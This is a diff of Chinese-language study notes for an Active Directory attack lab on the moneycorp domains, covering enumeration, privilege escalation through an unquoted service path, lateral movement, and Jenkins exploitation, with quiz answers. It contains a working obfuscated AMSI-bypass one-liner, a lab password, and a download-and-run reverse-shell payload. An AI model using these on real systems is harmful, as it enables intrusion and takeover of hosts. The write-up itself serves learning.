@@ -1,3 +1,7 @@
+# 客户端远程连接
+下载工具：
+https://mremoteng.org/download
+
 # 绕过AMSI
 ```
 S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
@@ -268,6 +272,9 @@ IsGroup      : False
 MemberDN     : CN=Administrator,CN=Users,DC=moneycorp,DC=local
 ```
 
+问题：SID of the member of the Enterprise Admins group
+答案：S-1-5-21-280534878-1496970234-700767426-500
+
 # Learning Objective - 2
 
 ## 获取所有OU
@@ -332,3 +339,516 @@ objectguid               : 8ecdfe44-b617-4b9e-a9f9-4d548e5dc7b1
 objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
 
 ```
+
+问题：Display name of the GPO applied on StudentMachines OU
+答案：Students
+
+# Learning Objective - 3
+
+## Task
+
+> ● Enumerate following for the dollarcorp domain:
+> − ACL for the Users group
+> − ACL for the Domain Admins group
+> − All modify rights/permissions for the studentx
+
+
+查找Users组的所有ACL
+
+```
+PS C:\AD> Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
+VERBOSE: Get-DomainSearcher search string: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
+VERBOSE: Get-DomainSearcher search string: LDAP://CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+VERBOSE: Get-DomainSearcher search string: LDAP://CN=Extended-Rights,CN=Configuration,DC=moneycorp,DC=local
+
+
+InheritedObjectType   : All
+ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
+ObjectType            : All
+IdentityReference     : NT AUTHORITY\SELF
+IsInherited           : False
+ActiveDirectoryRights : GenericRead
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-32-545
+
+InheritedObjectType   : All
+ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
+ObjectType            : All
+IdentityReference     : NT AUTHORITY\Authenticated Users
+IsInherited           : False
+ActiveDirectoryRights : GenericRead
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-32-545
+
+...
+...
+```
+
+同样的命令，查找Domain Admins组的所有ACL
+```
+PS C:\AD> Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
+VERBOSE: Get-DomainSearcher search string: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
+VERBOSE: Get-DomainSearcher search string: LDAP://CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+VERBOSE: Get-DomainSearcher search string: LDAP://CN=Extended-Rights,CN=Configuration,DC=moneycorp,DC=local
+
+
+InheritedObjectType   : All
+ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+ObjectType            : All
+IdentityReference     : NT AUTHORITY\Authenticated Users
+IsInherited           : False
+ActiveDirectoryRights : GenericRead
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512
+
+InheritedObjectType   : All
+ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+ObjectType            : All
+IdentityReference     : NT AUTHORITY\SYSTEM
+IsInherited           : False
+ActiveDirectoryRights : GenericAll
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512
+
+...
+...
+```
+
+查找本账户（sudent366）的所有modify rights/permissions
+```
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "sudent366"}
+```
+
+没有任何返回
+
+同样的命令，查询RDPUsers组的权限
+```
+PS C:\AD> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}
+
+
+InheritedObjectType   : All
+ObjectDN              : CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+ObjectType            : All
+IdentityReference     : dcorp\RDPUsers
+IsInherited           : False
+ActiveDirectoryRights : GenericAll
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-45101
+IdentitySID           : S-1-5-21-1874506631-3219952063-538504511-1116
+
+InheritedObjectType   : All
+ObjectDN              : CN=Control360User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+ObjectType            : All
+IdentityReference     : dcorp\RDPUsers
+IsInherited           : False
+ActiveDirectoryRights : GenericAll
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-45102
+IdentitySID           : S-1-5-21-1874506631-3219952063-538504511-1116
+```
+
+
+问题：ActiveDirectory Rights for RDPUsers group on the users named ControlxUser
+答案：GenericAll
+
+# Learning Objective - 4
+
+## Task
+> • Enumerate all domains in the moneycorp.local forest.
+> • Map the trusts of the dollarcorp.moneycorp.local domain.
+> • Map External trusts in moneycorp.local forest.
+> • Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
+
+
+枚举moneycorp.local林中的所有域
+```
+PS C:\AD> Get-NetForestDomain -Forest moneycorp.local
+
+
+Forest                  : moneycorp.local
+DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
+Children                : {us.dollarcorp.moneycorp.local}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : moneycorp.local
+PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
+RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
+InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
+Name                    : dollarcorp.moneycorp.local
+
+Forest                  : moneycorp.local
+DomainControllers       : {mcorp-dc.moneycorp.local}
+Children                : {dollarcorp.moneycorp.local}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  :
+PdcRoleOwner            : mcorp-dc.moneycorp.local
+RidRoleOwner            : mcorp-dc.moneycorp.local
+InfrastructureRoleOwner : mcorp-dc.moneycorp.local
+Name                    : moneycorp.local
+
+Forest                  :
+DomainControllers       :
+Children                :
+DomainMode              :
+DomainModeLevel         :
+Parent                  :
+PdcRoleOwner            :
+RidRoleOwner            :
+InfrastructureRoleOwner :
+Name                    : us.dollarcorp.moneycorp.local
+
+```
+
+枚举moneycorp.local林中的所有信任关系
+```
+PS C:\AD> Get-NetForestDomain -Verbose | Get-NetDomainTrust
+
+SourceName                 TargetName                      TrustType TrustDirection
+----------                 ----------                      --------- --------------
+dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
+dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
+dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
+moneycorp.local            dollarcorp.moneycorp.local    ParentChild  Bidirectional
+```
+
+
+枚举dollarcorp.moneycorp.local域中的所有信任关系
+```
+PS C:\AD> Get-NetDomainTrust -Domain dollarcorp.moneycorp.local
+
+SourceName                 TargetName                      TrustType TrustDirection
+----------                 ----------                      --------- --------------
+dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
+dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
+dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
+```
+
+
+
+枚举moneycorp.local林中所有的External trusts（外部信任）
+
+```
+PS C:\AD> Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq "External"}
+
+SourceName                 TargetName     TrustType TrustDirection
+----------                 ----------     --------- --------------
+dollarcorp.moneycorp.local eurocorp.local  External  Bidirectional
+```
+
+枚举eurocorp.local林中的所有信任关系
+```
+PS C:\AD> Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust
+
+SourceName     TargetName                   TrustType TrustDirection
+----------     ----------                   --------- --------------
+eurocorp.local eu.eurocorp.local          ParentChild  Bidirectional
+eurocorp.local dollarcorp.moneycorp.local    External  Bidirectional
+
+```
+
+问题：Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local
+答案：Bidirectional（双向信任）
+
+
+# Learning Objective - 5（1）
+
+## Task
+
+> ● Exploit a service on dcorp-studentx and elevate privileges to local administrator.
+> ● Identify a machine in the domain where studentx has local administrative access.
+> ● Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
+
+### 提权到local administrator
+使用beRoot.exe可以清楚看到AbyssWebServer有重启的权限，并且AbyssWebServer路径没有引号，可以利用提权
+```
+PS C:\AD> .\beRoot.exe
+|====================================================================|
+|                                                                    |
+|                    Windows Privilege Escalation                    |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+
+
+
+################ Service ################
+
+[!] Permission to create a service with openscmanager
+True
+
+[!] Check services that could its configuration could be modified
+Permissions: change config: True / start: True / stop: True
+Name: AbyssWebServer
+Display Name: Abyss Web Server
+
+Permissions: change config: True / start: True / stop: True
+Name: SNMPTRAP
+Display Name: SNMP Trap
+
+
+[!] Path containing spaces without quotes
+permissions: {'change_config': True, 'start': True, 'stop': True}
+Key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AbyssWebServer
+Full path: C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
+Name: AbyssWebServer
+Writables path found:
+        - C:\WebServer
+```
+
+
+使用privesc.ps1枚举，发现了两组疑似管理员的凭据，同样枚举到AbyssWebServer可以进行“未加引号的服务路径”提权。不过传文件过去的时候exe文件会被杀软杀掉
+```
+PS C:\AD> . .\privesc.ps1
+PS C:\AD> Invoke-Privesc
+Date of last applied patch - just use public exploits if not patched:
+8/17/2020
+
+----------------------------------------------------------------------
+
+Files that may contain Administrator password - you know what to do with this one:
+C:\Windows\panther\setupinfo
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+----------------------------------------------------------------------
+
+Services with space in path and not enclosed with quotes - if you have permissions run executable from different directory - exploit/windows/local/trusted_service_path:
+C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
+
+----------------------------------------------------------------------
+
+PATH variable entries permissions - place binary or DLL to execute before legitimate
+Group: student366, Permissions: FullControl on C:\Python27\
+Group: Users, Permissions: AppendData on C:\Program Files\Java\jdk-11.0.2\bin
+Group: Users, Permissions: CreateFiles on C:\Program Files\Java\jdk-11.0.2\bin
+
+----------------------------------------------------------------------
+
+System32 directory permissions - backdoor windows binaries:
+Permissions set on System32 directory are correct for all groups.
+
+----------------------------------------------------------------------
+
+System32 files and directories permissions - backdoor windows binaries:
+Group: Users, Permissions: CreateFiles, ReadAndExecute, Synchronize on C:\Windows\system32\spool\drivers\color
+
+----------------------------------------------------------------------
+```
+
+
+## PowerUp.ps1
+
+枚举所有“未加引号的服务路径”
+```
+PS C:\AD> . .\PowerUp.ps1
+PS C:\AD> Get-ServiceUnquoted
+
+
+ServiceName    : AbyssWebServer
+Path           : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
+ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
+CanRestart     : True
+
+ServiceName    : AbyssWebServer
+Path           : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
+ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
+```
+
+```
+PS C:\WebServer> whoami
+dcorp\student366
+PS C:\WebServer> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student366'
+
+ServiceAbused  Command
+-------------  -------
+AbyssWebServer net localgroup Administrators dcorp\student366 /add
+
+```
+
+枚举所有可以修改服务二进制文件的服务文件（ services where the current can make changes to service binary）
+```
+
+PS C:\AD> Get-ModifiableServiceFile -Verbose
+VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer
+
+
+ServiceName                     : AbyssWebServer
+Path                            : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
+ModifiableFile                  : C:\WebServer\Abyss Web Server\WebServer
+ModifiableFilePermissions       : AppendData/AddSubdirectory
+ModifiableFileIdentityReference : BUILTIN\Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
+CanRestart                      : True
+
+VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer
+ServiceName                     : AbyssWebServer
+Path                            : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
+ModifiableFile                  : C:\WebServer\Abyss Web Server\WebServer
+ModifiableFilePermissions       : WriteData/AddFile
+ModifiableFileIdentityReference : BUILTIN\Users
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
+CanRestart                      : True
+
+```
+
+enumerate services with weak service permissions.
+```
+ PS C:\AD> Get-ModifiableService -Verbose
+VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer
+VERBOSE: Current user has 'ChangeConfig' for AbyssWebServer
+VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer
+
+
+ServiceName   : AbyssWebServer
+Path          : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
+CanRestart    : True
+
+```
+
+问题：Service abused on the student VM for local privilege escalation
+答案：AbyssWebServer
+
+
+根据Get-ModifiableService枚举的结果，使用Invoke-ServiceAbuse，把当前账号添加到本地管理员组
+```
+PS C:\AD>
+PS C:\AD> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student366'
+
+ServiceAbused  Command
+-------------  -------
+AbyssWebServer net localgroup Administrators dcorp\student366 /add
+```
+
+# Learning Objective - 5（2）
+
+查找本地管理员可以用powershell远程登录的电脑
+```
+PS C:\AD> . .\Find-PSRemotingLocalAdminAccess.ps1
+PS C:\AD> Find-PSRemotingLocalAdminAccess
+dcorp-adminsrv
+dcorp-std366
+```
+可以看到可以远程登录两台电脑，一台是本机，一台是dcorp-adminsrv
+
+问题：Script used for hunting for admin privileges using PowerShell Remoting
+答案：Find-PSRemotingLocalAdminAccess.ps1
+
+
+
+现在我们可以用Enter-PSSession横向移动到另一台电脑dcorp-adminsrv（计算机全称=dcorp-adminsrv.dollarcorp.moneycorp.local，见上面当前域的计算机列表的枚举）
+
+```
+PS C:\AD> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet 3:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::34d5:8394:57f3:7610%3
+   IPv4 Address. . . . . . . . . . . : 172.16.100.66
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.100.254
+
+Tunnel adapter isatap.{6B6E4BEE-3BB9-4E5E-8522-6AC909EEF3D6}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+
+PS C:\AD> Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> whoami
+dcorp\student366
+
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::4de0:a61b:db3f:172c%2
+   IPv4 Address. . . . . . . . . . . : 172.16.4.101
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.4.254
+
+Tunnel adapter isatap.{5A335808-BE49-450F-AFA2-F08ED9EF5EEF}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+```
+
+# Learning Objective - 5（3）
+
+Jenkins 登录账号信息是：
+```builduser:builduser```
+
+文档说是手动枚举出来，我觉得这也太扯了。。
+
+问题：Jenkins user used to access Jenkins web console
+答案：builduser
+
+# Learning Objective - 5（4）
+
+powercat监听
+```
+PS C:\AD> . .\powercat.ps1
+PS C:\AD> powercat -l -v -p 443 -t 100
+VERBOSE: Set Stream 1: TCP
+VERBOSE: Set Stream 2: Console
+VERBOSE: Setting up Stream 1...
+VERBOSE: Listening on [0.0.0.0] (port 443)
+```
+因为本机装了python2，用python搭一个简单的http server
+
+```
+python -m SimpleHTTPServer 80
+```
+
+在Jenkins里我用下面payload一直反弹不了shell
+
+```powershell.exe iex (iwr http://172.16.100.66/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.66 -Port 443```
+
+提示无法从我本机下载脚本，不知道是不是网络问题
+
+但是可以执行其他命令得知Jenkins是由哪个用户运行的，使用```whoami /all```
+
+问题：Domain user used for running Jenkins service on dcorp-ci
+答案：ciadmin
+
+
